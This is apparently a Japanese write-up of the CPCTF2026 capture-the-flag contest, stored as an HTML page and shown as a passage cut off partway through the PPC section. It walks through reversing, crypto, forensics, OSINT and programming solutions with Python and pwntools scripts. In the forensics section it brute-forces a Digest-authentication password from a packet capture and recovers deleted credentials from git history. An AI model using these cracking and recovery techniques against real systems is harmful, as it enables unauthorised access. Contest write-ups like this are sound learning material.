@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>CPCTF2026 writeup</title>
+	<link rel="stylesheet" href="/css/default.css">
+	<link rel="stylesheet" href="/css/code.css">
+	<link rel="stylesheet" href="/css/ctf.css">
+	<style>
+		.flag::before{
+			content: "CPCTF{";
+		}
+		details > div, .waku{
+			border: 1px solid var(--text-color);
+			border-left: 2px solid var(--text-color);
+		}
+	</style>
+</head>
+<body class="body_w60 theme-light">
+	<div id="top_toggles">
+		<input type="checkbox" id="theme_switch" class="toggle-switch">
+		<label for="theme_switch" id="theme_toggle" class="toggle-button" aria-label="テーマ切り替え"></label>
+		<input type="checkbox" id="flag_switch" class="toggle-switch">
+		<label for="flag_switch" id="flag_toggle" class="toggle-button" aria-label="フラグ表示切り替え"></label>
+	</div>
+	<a href="/index.html" id="back_to_main">戻る</a>
+	<h1>CPCTF2026 writeup</h1>
+	<pre>sig_255</pre>
+	<pre>全体　: 25位</pre>
+	<pre>新入生:  3位</pre>
+	<pre>スコア: 3136</pre>
+	<div class="waku">
+		<p><span class="solved">この色</span>の問題はコンテスト中に解いた問題です。</p>
+		<p><span class="upsolved">この色</span>の問題はコンテスト中には解けなかったけど、後から解いた問題です。</p>
+		<p><span class="unsolved">この色</span>の問題はまだ解けていない問題です。</p>
+		<p>この色の問題はまだwriteupを書いていない問題です。</p>
+	</div>
+	<h2>Reversing</h2>
+	<details class="solved"><summary>Lv.1 | Hidden</summary>
+		<div>
+			<p>ファイル内にフラグの文字列があると考える</p>
+			<p><a href="https://gitlab.com/devill.tamachan/binaryeditorbz">Binary Editor BZ</a>で<code>CPCTF</code>を検索するとフラグがヒットした</p>
+		</div>
+		<pre><samp class="flag">H1dd3n_1n_5tr1ngs</samp></pre>
+	</details>
+	<details class="solved"><summary>Lv.2 | Omikuji</summary>
+		<div>
+			<p>とりあえず<a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a>で見てみると、<code>main</code>関数において<code>std::__cxx11::string::operator+=</code>でフラグの文字列を構築していることがわかる</p>
+			<p>Decompileの欄からそのままコピーしてフラグの文字列を抜き出せる</p>
+		</div>
+		<pre><samp class="flag">D3r_4173_wurf317_n1ch7</samp></pre>
+		<div>
+			<p>または、その後<code>omikuji</code>関数にフラグの文字列が渡されているので、gdbで<code>omikuji</code>をブレークポイントにして、引数を確認してもよい</p>
+			<pre><code class="bash">chmod +x omikuji</code></pre>
+			<pre><code class="bash">gdb ./omikuji</code></pre>
+			<pre><code class="gdb">b omikuji</code></pre>
+			<pre><code class="gdb">r</code></pre>
+			<pre><code class="gdb">x/s $rsi</code></pre>
+			<pre><samp>0x55555556d2b0: "<span class="flag">D3r_4173_wurf317_n1ch7</span>"</samp></pre>
+			<pre><code class="gdb">q</code></pre>
+		</div>
+	</details>
+	<details class="solved"><summary>Lv.3 | Out of World</summary>
+		<div>
+			<p>ここでも<a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a>で見てみる</p>
+		</div>
+		<div>	
+			<p>エントリポイントの関数内で呼び出されるmain関数では</p>
+			<pre><code>char* secret_key = getenv("CTF_SECRET_KEY");
+if (verify_key(secret_key)) {
+	puts("OK, the check passed! Here is the flag:");
+	print_flag(secret_key);
+} else {
+	puts("See you!");
+}</code></pre>
+			<p>なる処理が行われている</p>
+			<p><code>secret_key</code>が正しくないと<code>verify_key</code>でも<code>print_flag</code>でもフラグの情報は分からない</p>
+		</div>
+		<div>
+			<p><code>verify_key</code>では</p>
+			<pre><code>size_t verify_key (char* key) {
+	if (strlen(key) != 24) return 0;
+	for (size_t i = 0; i < 24; ++i) {
+		if (key[i] ^ '#' != "wkjp|jp|pvsfq|pf`qfw|hfz"[i]) return 0;
+	}
+	return 1;
+}</code></pre>
+			<p>なる処理が行われている</p>
+			<p><code>key</code>は24字で、各文字は<code>#</code>とXORを取ると<code>wkjp|jp|pvsfq|pf`qfw|hfz</code>となることがわかる</p>
+		</div>
+		<div>
+			<p><code>key</code>を復元するpythonコードを書いて実行すると、</p>
+			<pre><code>for c in "wkjp|jp|pvsfq|pf`qfw|hfz":
+	print(chr(ord(c) ^ ord('#')), end="")</code></pre>
+			<pre><samp>THIS_IS_SUPER_SECRET_KEY</samp></pre>
+		</div>
+		<div>
+			<p>環境変数<code>CTF_SECRET_KEY</code>をこれに設定して実行すればフラグが出力される</p>
+			<pre><code class="bash">export CTF_SECRET_KEY=THIS_IS_SUPER_SECRET_KEY</code></pre>
+			<pre><code class="bash">./chal</code></pre>
+			<pre><samp>OK, the check passed! Here is the flag:
+<span class="flag">c4n_y0u_f1nd_3nv1r0nm3n7_v4r1abl35</span></samp></pre>
+		</div>
+		<pre><samp class="flag">c4n_y0u_f1nd_3nv1r0nm3n7_v4r1abl35</samp></pre>
+		<div>
+			<p>または、<code>print_flag</code>の中では</p>
+			<pre><code>for (size_t i = 0; i < 41; ++i) {
+	flag[i] = key[i % 24] ^ "R]OB\\wu.xOl0bEp1hs_\"tx1n!ca%t;Il\"b$auv%5{"[i] ^ 0x45;
+}</code></pre>
+			<p>なる処理が行われている</p>
+			<p>フラグは41字で、各文字は<code>key</code>の対応する文字と<code>0x45</code>でXORを取ると<code>R]OB\wu.xOl0bEp1hs_"tx1n!ca%t;Il"b$auv%5{</code>となることがわかる</p>
+		</div>
+		<div>
+			<p><code>key</code>と同様に復元するpythonコードを書いて実行すると、</p>
+			<pre><code>key = "THIS_IS_SUPER_SECRET_KEY"
+for i, c in enumerate("R]OB\\wu.xOl0bEp1hs_\"tx1n!ca%t;Il\"b$auv%5{"):
+	print(chr(ord(c) ^ ord(key[i % 24]) ^ 0x45), end="")</code></pre>
+			<pre><samp class="flag">c4n_y0u_f1nd_3nv1r0nm3n7_v4r1abl35</samp></pre>
+		</div>
+	</details>
+	<details><summary>Lv.4 | viGor</summary></details>
+	<h2>Crypto</h2>
+	<details class="solved"><summary>Lv.1 | Dualcast</summary>
+		<div>
+			<p><code>flag</code>が<code>encode</code>(文字列→バイト列)されたうえで<code>bytes_to_long</code>(バイト列→整数)されて出力されているので、</p>
+			<p>逆に<code>long_to_bytes</code>(整数→バイト列)してから<code>decode</code>(バイト列→文字列)すればフラグが得られる</p>
+			<pre><code>from Crypto.Util.number import long_to_bytes
+import out
+print(long_to_bytes(out.c).decode())</code></pre>
+		</div>
+		<pre><samp class="flag">wh47_7yp3_15_y0ur_477r1bu73?</samp></pre>
+	</details>
+	<details class="solved"><summary>Lv.2 | Very Exciting</summary>
+		<div>
+			<p>コードが長いので変数名も含め整理すると、</p>
+			<pre><code>key = urandom(16)
+iv = urandom(16)
+flag = getenv("FLAG").encode()
+myPKSG = f(key, iv)
+enc_flag = g(myPKSG, flag)
+print(iv.hex())
+print(enc_flag.hex())
+input_flag = bytes.fromhex(input("favorite: "))
+assert input1 != enc_flag
+input_iv = bytes.fromhex(input("very_exciting: "))
+assert len(input2) == 16
+yourPKSG = f(key, input_iv)
+enc_input_flag = g(yourPKSG, input_flag)
+print(enc_input_flag.hex())</code></pre>
+		</div>
+		<div>
+			<p>さらに整理すると、</p>
+			<ol>
+				<li>
+					<p><code>iv1</code>と<code>g(f(key, iv1), flag1)</code>が出力される</p>
+					<p><code>iv1</code>は16バイトである</p>
+					<p><code>key</code>は16バイトである</p>
+				</li>
+				<li>
+					<p><code>flag2</code>と<code>iv2</code>を入力する</p>
+					<p><code>flag2</code>は<code>g(f(key, iv1), flag1)</code>とは異なる必要がある</p>
+					<p><code>iv2</code>は16バイトである必要がある</p>
+				</li>
+				<li><code>g(f(key, iv2), flag2)</code>が出力される</li>
+			</ol>
+			<p><code>flag1</code>が求めたいフラグ</p>
+		</div>
+		<div>
+			<p><code>f</code>は引数に完全に依存して乱数生成器を初期化したものを返しているので、<code>iv2</code>を<code>iv1</code>と同じにすれば同じ乱数生成器で<code>g</code>を実行できる</p>
+			<p><code>g</code>は乱数生成器<code>f(key, iv)</code>で1文字ずつXORをしているので、<code>flag1 ^ g(f(key, iv1), flag1) = g(f(key, iv2), flag2) ^ flag2</code></p>
+			<p><code>flag1 = g(f(key, iv1), flag1) ^ g(f(key, iv2), flag2) ^ flag2</code>となる</p>
+		</div>
+		<div>
+			<p>pythonコードで書くと、</p>
+			<pre><code>from pwn import remote
+
+host = "133.88.122.244"
+port = 32007
+r = remote(host, port)
+
+r.recvuntil(b"used!: ")
+iv1 = r.recvline().strip()
+
+r.recvuntil(b" => ")
+xor1 = bytes.fromhex(r.recvline().strip().decode())
+
+r.recvuntil(b"(Hex): ")
+r.sendline(b"00" * len(xor1))
+
+r.recvuntil(b"(Hex): ")
+r.sendline(iv1)
+
+r.recvuntil(b" => ")
+xor2 = bytes.fromhex(r.recvline().strip().decode())
+
+print(bytes(a ^ b for a, b in zip(xor1, xor2)).decode())</code></pre>
+		</div>
+		<pre><samp class="flag">SAMe_01d_STReam_1s_A1WaYs_b0r1ng</samp></pre>
+	</details>
+	<details class="solved"><summary>Lv.3 | 1, 0, 7</summary>
+		<div>
+			<p>明らかにNが怪しい</p>
+			<p><code>N = 111(1が317個)000(0が95個)777(7が317個)</code></p>
+			<p><code>N = 1000(0が317+95-1個)7 <b>×</b> 111(1が317個)</code></p>
+		</div>
+		<div>
+			<p>p,qが分かったので、RSAを復号できる。pythonコードで書くと、</p>
+			<pre><code>from Crypto.Util.number import long_to_bytes
+from py107 import N, e, c
+p = 10**(317+95)+7
+q = N // p
+d = pow(e, -1, (p-1)*(q-1))
+print(long_to_bytes(pow(c, d, N)).decode())</code></pre>
+		</div>
+		<pre><samp class="flag">N_1s_34sy_70_bRe4k_873b4982a</samp></pre>
+	</details>
+	<details class="solved"><summary>Lv.3 | Anomaly 2</summary>
+		<div>
+			<p>RSA暗号になっていない。<code>n^3 mod m</code>と<code>n</code>が2組与えられている</p>
+			<p><code>n^3 - (n^3 mod m) = k * m</code>であることを踏まえれば</p>
+			<p><code>m * (ある程度小さい整数) = gcd(n^3 - (n^3 mod m), n^3 - (n^3 mod m))</code>であるから、とりあえず</p>
+			<p><code>m * (ある程度小さい整数)</code>を求める</p>
+		</div>
+		<div>
+			<p>そのままではフラグにならなかった。下2桁が<code>30</code>なので、2で割ってみて<code>long_to_bytes</code>してみるとフラグが得られる。つまり、<code>ある程度小さい整数</code>は2だった</p>
+			<p>pythonコードで書くと、</p>
+			<pre><code>from math import gcd
+from Crypto.Util.number import long_to_bytes
+from output import n1, c1, n2, c2
+print(long_to_bytes(gcd(n1**3 - c1, n2**3 - c2) // 2).decode())</code></pre>
+		</div>
+		<pre><samp class="flag">7h3_n3x7_574710n_15_Kukud0</samp></pre>
+	</details>
+	<details class="solved"><summary>Lv.3 | Janken Master</summary>
+		<div>
+			<p>正直乱数生成のアルゴリズムをよく理解したわけではないが、シード値が0だと乱数列が全て0になりそう</p>
+			<p><code>seed = int(seed_input) ^ 0x1234567890abcdef1234567890abcdef</code>だから、この値をそのまま入力する</p>
+		</div>
+		<div>
+			<p>pythonコードで書くと、</p>
+			<pre><code>from pwn import remote
+host = "133.88.122.244"
+port = 32212
+r = remote(host, port)
+r.recvuntil(b"(seed): ")
+r.sendline(str(int("1234567890abcdef1234567890abcdef", 16)).encode())
+r.recvuntil(b"(0-2): ")
+r.sendline(b"2")
+r.interactive()</code></pre>
+			<pre><samp>--- Result ---
+Your hand: 2
+NPC hands: Rock=99, Scissors=0, Paper=0
+
+Congratulations! You are the SOLE winner!
+Here is your reward: <span class="flag">M45TER_of_riGGed_d1Ce</span></samp></pre>
+		</div>
+		<pre><samp class="flag">M45TER_of_riGGed_d1Ce</samp></pre>
+	</details>
+	<details class="solved"><summary>Lv.4 | Bitwise Scrumble</summary>
+		<div>
+			<p>75文字のフラグを25文字ごとに分け、それぞれ25文字の<code>key</code>一緒に1文字ずつ処理している</p>
+			<p>前半25文字: <code>(f | k) & (f ^ k)</code></p>
+			<p>こりゃあ。。<code>f ^ k</code>でよいですね。</p>
+			<p>中盤25文字: <code>(s & k) ^ (s | k)</code></p>
+			<p>これも。。<code>s ^ k</code>でよいですね。</p>
+			<p>後半25文字: <code>t ^ ((t | k) & k)</code></p>
+			<p>こりゃあ完全に<code>t ^ k</code>でよいでしょう！</p>
+		</div>
+		<div>
+			<p>ということで、全部<code>key</code>とXORを取ればフラグが得られる。pythonコードで書くと、</p>
+			<pre><code>from Crypto.Util.number import long_to_bytes
+enc_bytes = "10aa77170b38758c146245779086332e5e8237430f362d317310124333b999b890043152135"
+key = "0123456789012109876543210"
+n = 0
+for i, c in enumerate(enc_bytes):
+	n = n * 10 + (int(c, 16) ^ int(key[i % len(key)], 16))
+print(long_to_bytes(n).decode())</code></pre>
+		</div>
+		<pre><samp class="flag">B1twis3_r0t4t10n!_3tim3s</samp></pre>
+	</details>
+	<details><summary>Lv.5 | mod N Janken</summary></details>
+	<h2>Forensics</h2>
+	<details class="solved"><summary>Lv.1 | L0v3 PDF</summary>
+		<div>
+			<p>ReversingのHiddenと同様に、ファイル内にフラグの文字列があると考える</p>
+			<p><a href="https://gitlab.com/devill.tamachan/binaryeditorbz">Binary Editor BZ</a>で<code>CPCTF</code>を検索するとフラグがヒットした</p>
+		</div>
+		<pre><samp class="flag">Lets_P1ey_W1th_PdFs</samp></pre>
+	</details>
+	<details class="solved"><summary>LV.2 | Flag in Flags</summary>
+		<div>
+			<p>PNGファイルは可逆圧縮なので、視覚的影響がほとんどない画素の下位ビットに直接情報を埋め込むことができる。</p>
+			<p><a href="https://github.com/Giotino/stegsolve">StegSolve</a>で画像を開き、RGBの各ビットで画像を見ると、特にGの下から3,4ビット目でフラグの文字列が浮かび上がる</p>
+		</div>
+		<pre><samp class="flag">FLAG_MANY_FLAGS_FLAG</samp></pre>
+	</details>
+	<details class="solved"><summary>Lv.2 | Secret Recipe</summary>
+		<div>
+			<p><a href="https://www.wireshark.org/">Wireshark</a>でpcapファイルを開く</p>
+			<p>Webサイトにアクセスしている履歴ということで、<code>ファイル→オブジェクトをエクスポート→HTTP</code>からすべてのHTTPオブジェクトをエクスポートし、<code>\</code>としてエクスポートされたものを例えば<code>index.html</code>という名前にしてブラウザで開けば、おばあちゃんのレシピの秘密のコツの画像にフラグが書いてあるのがわかる</p>
+		</div>
+		<pre><samp class="flag">511j_sov17</samp></pre>
+	</details>
+	<details class="solved"><summary>Lv.3 | credentials</summary>
+		<div>
+			<p>調べると、<code>filter-branch</code>コマンドによってなかったことにされたファイルも、<code>git reflog</code>コマンドで参照できるコミットの履歴から復元できるみたい</p>
+		</div>
+		<div>
+			<pre><code>git reflog</code></pre>
+			<pre><samp>ba5b001 (HEAD -> master) HEAD@{0}: filter-branch: rewrite
+725b1cf HEAD@{1}: commit: delete flag from repository
+1b9465c HEAD@{2}: commit (initial): initial commit</samp></pre>
+			<p>コミット<code>725b1cf</code>でフラグが書いてあるファイルを消していることがわかる</p>
+		</div>
+		<div>		
+			<pre><code>git show 725b1cf</code></pre>
+			<p><code>flag.txt</code>が削除され、<code>main.py</code>が編集されたコミットであることがわかり、フラグの中身も見れる</p>
+			<p><code>flag.txt</code>が削除される前に一時的に戻りたいときは、<code>git checkout 1b9465c</code>とすればよい</p>
+		</div>
+		<pre><samp class="flag">n3ver_c0mmit_y0ur_cr3dential5</samp></pre>
+	</details>
+	<details class="solved"><summary>Lv.3 | digest</summary>
+		<div>
+			<p><a href="https://www.wireshark.org/">Wireshark</a>でpcapファイルを開き、<code>分析→追跡→HTTPストリーム</code>から通信の内容を見てみると、<a href="https://ja.wikipedia.org/wiki/Digest%E8%AA%8D%E8%A8%BC">Digest認証 - Wikipedia</a>の例のとおりに通信が行われていた。</p>
+			<p>サーバーでは、ユーザーから送られてきた<code>method</code><code>username</code><code>realm</code><code>nonce</code><code>uri</code><code>qop</code><code>nc</code><code>cnonce</code>とパスワードを用いて<code>response</code>を計算し、ユーザーから送られてきた<code>response</code>と一致するか確認している</p>
+			<p>パスワードは数字8桁のことなので、総当たりで計算して<code>response</code>と一致するか確認すれば良い</p>
+		</div>
+		<div>
+			<p>pythonコードで書いて実行すると、</p>
+			<pre><code>import hashlib
+
+method="GET"
+username="cpctf"
+realm="Restricted"
+nonce="+pHR2klPBgA=dea9c5d3f34f861b03f0be19a41069cf29603de5"
+uri="/"
+qop="auth"
+nc="00000001"
+cnonce="1afdf6a5de6ae0bc"
+
+response_target="b71427f528886528c5144cd259a83d97"
+
+def md5(s : str):
+	return hashlib.md5(s.encode()).hexdigest()
+
+for i in range(100000000):
+	password = f"{i:08d}"
+	A1 = md5(username + ':' + realm + ':' + password)
+	A2 = md5(method + ':' + uri)
+	response = md5(A1 + ':' + nonce + ':' + nc + ':' + cnonce + ':' + qop + ':' + A2)
+	if response == response_target:
+		print(password)
+		break</code></pre>
+			<p>パスワードが分かったので、ユーザー名とパスワードを入力してサーバーにアクセスすればフラグが得られる</p>
+		</div>
+		<pre><samp class="flag">d1g3st_4uth_15_4_ch4ll3ng3</samp></pre>
+	</details>
+	<details><summary>Lv.5 | Authorized Whale</summary></details>
+	<h2>Misc</h2>
+	<details class="upsolved"><summary>Lv.1 | Sanity Check</summary>
+		<div>
+			<p>コンテスト中にアンケートに入力するのを忘れてました。。コンテスト後に入力したのでゆるしてください。。</p>
+		</div>
+		<pre><samp class="flag">th4nk_y0u_for_p1aying</samp></pre>
+		<div>
+			<p>この手の問題(?)ではよく知られた話(?)ではあるが、アンケートに答えることなくフラグを入手できる</p>
+			<p><code class="bash">curl https://docs.google.com/forms/d/e/1FAIpQLSeZjeNb4tw8PmQ585RrPXCeXm7eDhIrzbiYAqf8_l-mqKKY2Q/viewform | grep -o 'CPCTF{[^}]*}'</code></p>
+			<pre><samp class="flag">th4nk_y0u_for_p1aying</samp></pre>
+		</div>
+	</details>
+	<details><summary>Lv.3 | Hello LaTeX3!!!</summary></details>
+	<details class="solved"><summary>Lv.3 | QRRRRRRRRRR</summary>
+		<div>
+			<p>一般的なQRコードリーダーでは内容を解釈できないコードが与えられる</p>
+			<p>（注：QRコードとしてのデコードは可能だが、得られるデータはプレインテキストではない）</p>
+		</div>
+		<div>
+			<p>ほんとうはすごく迷走しましたが、以下ではその迷走した部分はなしで最終的にフラグを得ることができた過程だけ書きます</p>
+		</div>
+		<div>
+			<p><a href="https://github.com/waidotto/strong-qr-decoder">strong-qr-decoder</a>で読み取ると、<b><code>RSブロック分割後:</code>に</b>以下のビット列が得られる</p>
+			<pre><samp>['01100001', '10010100', '00011110', '10001011', '10000101', '01101000', '00001101', '01110011', '10101011', '10000011', '01001111', '01011110', '10011111', '01111101', '00010001', '00001000', '11011001', '00011100', '01110111', '11100110', '00110110', '11000011', '11110110', '00000101', '00100011', '00110111', '10100011', '10110111', '01100111', '01000100', '00110101', '00000100', '00110101', '00000100', '01000000']
+['00011000', '00101010', '01010010', '11010010', '01000010', '10101101', '11000111', '11011000', '00100110', '00000101', '10111110', '11101000', '01100010', '10101000', '00011000', '01110111', '01010100', '01101011', '00010001', '11101100', '11010000', '01000111', '01000011', '01000111', '01000011', '11110110', '11100101', '00110110', '01000011', '01000110', '00010110', '10000011', '11110110', '10000101', '01000110']</samp></pre>
+			<p>この中にCPCTFの<code>C</code>、つまりバイト列で言うと<code>01000011</code>を探すと、1つ目のブロックの後ろから3,4バイトの境界、5,6バイトにあるので、ここがフラグの文字列の開始位置と予想できるが、そのままでは<code>CPCtv;z3 ...</code>となってしまう。でも、下位4ビットは同じなので筋は良さそう。</p>
+			<p>後ろのバイトも使うことを考えたりして試すと、後ろのバイトの後方4ビット+現在のバイトの前方4ビットでうまくいくことがわかる。つまり、バイトごとに逆順にしたうえで、オフセットを4ビットとすれば良い</p>
+		</div>
+		<div>
+			<p>これを1,2ブロック目にそれぞれ適用して出力するpythonコードを書いて実行すると、</p>
+			<pre><code>RS1 = ['01100001', '10010100', '00011110', '10001011', '10000101', '01101000', '00001101', '01110011', '10101011', '10000011', '01001111', '01011110', '10011111', '01111101', '00010001', '00001000', '11011001', '00011100', '01110111', '11100110', '00110110', '11000011', '11110110', '00000101', '00100011', '00110111', '10100011', '10110111', '01100111', '01000100', '00110101', '00000100', '00110101', '00000100', '01000000']
+RS2 = ['00011000', '00101010', '01010010', '11010010', '01000010', '10101101', '11000111', '11011000', '00100110', '00000101', '10111110', '11101000', '01100010', '10101000', '00011000', '01110111', '01010100', '01101011', '00010001', '11101100', '11010000', '01000111', '01000011', '01000111', '01000011', '11110110', '11100101', '00110110', '01000011', '01000110', '00010110', '10000011', '11110110', '10000101', '01000110']
+
+def valid_char(c):
+	if 32 <= c < 127:
+		return chr(c)
+	return '#'
+def output_string(bits):
+	s = ""
+	for i in range(4, len(bits), 8):
+		s += valid_char(int(bits[i:i+8], 2))
+	print(s)
+
+output_string("".join(RS1[::-1]))
+output_string("".join(RS2[::-1]))</code></pre>
+			<pre><samp>#CPCTF{z3r0_l3ngq########:#0##X##F#
+h_h1dd3n_d4t4}####Gq##.##Rm#z#-%"##</samp></pre>
+		</div>
+		<div>
+			<p>これをもとに、以下のようにして実行すればフラグを得ることができた</p>
+			<pre><code>from Crypto.Util.number import long_to_bytes
+
+RS1 = (略)
+RS2 = (略)
+
+print(long_to_bytes(int("".join(RS1[::-1])[12:136] + "".join(RS2[::-1])[:116], 2)).decode())</code></pre>
+		</div>
+		<pre><samp class="flag">z3r0_l3ngth_h1dd3n_d4t4</samp></pre>
+	</details>
+	<details><summary>Lv.4 | Damaged Report</summary></details>
+	<h2>OSINT</h2>
+	<details class="solved"><summary>Lv.2 | IRIS OUT</summary>
+		<div>
+			<p>IRIS OUTが何なのかよく分からないけどとりあえず問題文に基づいて<code>紅白 IRIS OUT 撮影場所</code>で調べると<a href="https://slope7654rk.blog.jp/archives/52416040.html">米津玄師「IRIS OUT」紅白歌合戦のロケ地は銀座・KK線／中央区銀座 </a>←適当なサイトが見つかる。</p>
+			<p>あとは<a href="https://www.youtube.com/watch?v=MJ70B_cwnPk?t=220">米津玄師 – IRIS OUT「第76回NHK紅白歌合戦」　Kenshi Yonezu – IRIS OUT (76th NHK Kouhaku Performance) - YouTube</a>←公式の動画とGoogle Earthを見比べて、場所を絞る</p>
+		</div>
+		<pre><samp class="flag">35674_139765</samp></pre>
+	</details>
+	<details class="solved"><summary>Lv.2 | PENGUIN</summary>
+		<div>
+			<p><code>ペンギン 個体番号 識別</code>で調べると、<a href="https://dl.nkmr-lab.org/papers/534/paper.pdf">水族館でのペンギン個体識別法の調査と腹部模様に着目した観察手法の比較検証</a>←だいぶ新しい論文が見つかり、18の水族館でのペンギンの識別法について表にまとめられている</p>
+			<p>画像では1つのバンドに4つのビーズがつけられていたので、表の中では<code>名古屋港水族館</code>と<code>海遊館</code>がこれにあたる。</p>
+			<p>（もちろんこの中にあるとは限らないが、）それぞれについてビーズの色の組み合わせと個体番号の対応関係を調べると、<code>海遊館</code>については見つからなかったが、<code>名古屋港水族館</code>については論文中の写真で説明されていた</p>
+		</div>
+		<div>
+			<p>それに基づくと、右上のペンギンのビーズの並びは背中側から順に<code>黄 緑 白 青</code>であり、バンドは<code>白色</code>であることから個体番号がわかる</p>
+			<p>この個体番号で提出すると正解だった</p>
+		</div>
+		<pre><samp class="flag">397</samp></pre>
+	</details>
+	<details class="solved"><summary>Lv.3 | Night View</summary>
+		<div>
+			<p>大きなビルは都市部にたくさんあって見分けがつかないが大きな橋は特徴的なので、<a href="https://www.google.com/">Google</a>の画像検索で枠を橋に絞ると、橋の名前は<code>レインボーブリッジ</code>らしいことがわかる。</p>
+			<p>あとは、Google Earthでレインボーブリッジ周辺を見て、画角を合わせる。</p>
+		</div>
+		<pre><samp class="flag">333413426</samp></pre>
+	</details>
+	<h2>PPC</h2>
+	<details class="solved"><summary>Lv.1 | Modulo Equation</summary>
+		<div>
+			<p>ぱっと見たときに高速に解を出す方法が思いつかなかったが、求めるxは10⁵以下であるそうなので全探索をする</p>
+			<p>コンピューターは3×10⁹Hz程度で動くので、10⁵回の検証は十分高速にできる</p>
+		</div>
+		<p>提出: <a href="https://yukicoder.me/submissions/1160122">#1160122 (C++17(gcc12)) No.3498 Modulo Equation - yukicoder</a></p>
+	</details>
+	<details class="solved"><summary>Lv.1 | Sign up for traP</summary>
+		<div>
+			<p>文字列S中の全ての文字について判定したうえで、先頭と末尾を追加で判定すればいい</p>
+			<p>文字列の判定は、<code>0以上9以下またはA以上Z以下またはa以上z以下または_または-</code>と判定してもよいが、文字コードをインデックスとして扱い有効か無効かを判定できる配列を用意しておけば高速(今回はあまり意味ないが、実用的だと思っている)</p>
+		</div>
+		<p>提出: <a href="https://yukicoder.me/submissions/1160121">#1160121 (C++17(gcc12)) No.3497 Sign up for traP - yukicoder</a></p>
+	</details>
+	<details class="solved"><summary>Lv.2 | 01 String</summary>
+		<div>
+			<p>0がn個、1がm個続いた区間を考えると、</p>
+			<p><code>000...00, 000...01, ... , 001...11, 011...11, 111...11</code>のn+m+1通りが考えられる。</p>
+			<p>また、他の区間から0が左から、1が右から陣地を増やしてきたりしてもこの中のいずれかである。</p>
+			<p>よって、各区間のn+m+1の総積を(逐次modしながら)計算すれば答えになる。</p>
+		</div>
+		<p>提出: <a href="https://yukicoder.me/submissions/1160126">#1160126 (C++17(gcc12)) No.3500 01 String - yukicoder</a></p>
+	</details>
+	<details class="solved"><summary>Lv.2 | Bracket Stack Query 2</summary>
+		<div>
+			<p><code>(</code>で高さは1大きくなり、<code>)</code>で高さは1小さくなるとする。</p>
+			<p>これ以上右に何を足しても<code>良い棒付き括弧列</code>にならない文字列になった時点で、その前の時点での文字列長を保存しておき、その文字列長に戻るまでは無視するものとする。この状態を 打ち切り と表現する。</p>
+			<p>こうすれば、その時点での文字列が<code>良い棒付き括弧列</code>である条件は、高さが<code>0</code>であり打ち切られていない、となる。</p>
+			<p>打ち切られていない際、以下の操作を行うことで、打ち切りを判定できる。</p>
+			<p><code>(</code>を追加する際にその高さでのフラグを<code>flase</code>とする。</p>
+			<p><code>|</code>を追加する際に、すでにその高さでのフラグが<code>true</code>なら打ち切り、そうでないならフラグを<code>true</code>にする。</p>
+			<p><code>)</code>を追加する際に、高さが<code>-1</code>またはその高さでのフラグが<code>false</code>なら打ち切る。そうでないならその高さ以上では<code>良い棒付き括弧列</code>になっている。</p>
+			<p>末尾の文字を削除するときは、これと逆のことをすればいい。</p>
+		</div>
+		<p>提出: <a href="https://yukicoder.me/submissions/1160137">#1160137 (C++17(gcc12)) No.3503 Brackets Stack Query 2 - yukicoder</a></p>
+	</details>
+	<details class="solved"><summary>Lv.2 | I Love DAG</summary>
+		<div>
+			<p>サイクルがあるということは、ある頂点から、有向辺の頂点番号をたどっていくと自分の頂点番号にたどり着く。</p>
+			<p>自分の番号にたどり着かなければいいから、頂点番号の大小を有向辺の向きにすればいい。</p>
+		</div>
+		<p>提出: <a href="https://yukicoder.me/submissions/1160124">#1160124 (C++17(gcc12)) No.3499 I Love DAG - yukicoder</a></p>
+	</details>
+	<details class="solved"><summary>Lv.3 | Digit Products 2</summary>
+		<div>
+			<p>最高位の数は0ではないから、最高位以外が0かどうかは1手で判定できる。</p>
+			<p>0でない位が3つあるなら、それらの数を<code>a,b,c</code>として、出力される<code>ab,bc,ca</code>から<code>a²=ab*ca/bc,b²=ab*bc/ca,c²=bc*ca/ab</code>と定まる。</p>
+			<p>そして、それ以外の桁も定まった桁との積を見れば求まる。</p>
+			<p>0でない位が2つだけなら、それらの数が異なっている場合一意に定まらない。また、2*2=1*4, 3*3=1*9, 4*4=2*8, 6*6=4*9であるから、積が<code>1,25,49,64,81</code>である場合のみそれら2つの数がどちらも<code>1,5,7,8,9</code>であると定まる。</p>
+			<p>0でない位が1つのときは、もちろん定まらない。</p>
+		</div>
+		<p>提出: <a href="https://yukicoder.me/submissions/1161892">#1161892 (C++17(gcc12)) No.3501 Digit Products 2 - yukicoder</a></p>
+		<p>なお、コンテスト中に提出した、余計な分岐があるコードは<a href="https://yukicoder.me/submissions/1160142">こちら</a></p>
+	</details>
+	<details class="solved"><summary>Lv.3 | GCD Knapsack</summary>
+		<div>
+			<p>各商品の重みX_iの約数はたかだかO(√X_i)個であり、列挙もO(√X_i)で行える。</p>
+			<p>「ある数について、その数を重みの約数に持つ商品の値段の総和」の最大値を求めたい</p>
+			<p>商品iの重みX_iの全ての約数dに対して、「数dを重みの約数に持つ商品の値段の総和」に値段Y_iを加えれば良い。</p>
+			<p>これをすべての商品に対して行って、最後に「数dを重みの約数に持つ商品の値段の総和」の最大値を求めれば良い。</p>
+		</div>
+		<p>提出: <a href="https://yukicoder.me/submissions/1160145">#1160145 (C++17(gcc12)) No.3502 GCD Knapsack - yukicoder</a></p>
+	</details>
+	<details class="solved"><summary>Lv.3 | Insert Maze</summary>
+		<div>
+			<p>例えばスタートの右の列との間を空き列にして、ゴールの上の行との間を空き行にすれば、スタートから右の列を通ってゴールの上の行を通ってゴールにたどり着けるようになる。</p>
+			<p>つまり超能力発動回数は大きくても2。スタートからゴールに右と下への移動だけでたどり着ける場合のみ0。</p>
+			<p>1回で可能か判定するときは、スタートからは右と下、ゴールから左と上への移動だけでたどり着けるマスをそれぞれ探索したあとに、それらの列番号または行番号が隣り合うものがあるかどうかを見ればいい。</p>
+		</div>
+		<p>提出: <a href="https://yukicoder.me/submissions/1160146">#1160146 (C++17(gcc12)) No.3504 Insert Maze - yukicoder</a></p>
+	</details>
+	<details class="solved"><summary>Lv.3 | Sum of Prod of Root</summary>
+		<div>
+			<p>平方根(k=2)は長い間一定なので、それを利用すれば計算量はO(√N)程度で済む。</p>
+			<p>だが、足りなかったので、10¹⁶ごとの結果を100分割して埋め込みました。ごめんなさい。</p>
+		</div>
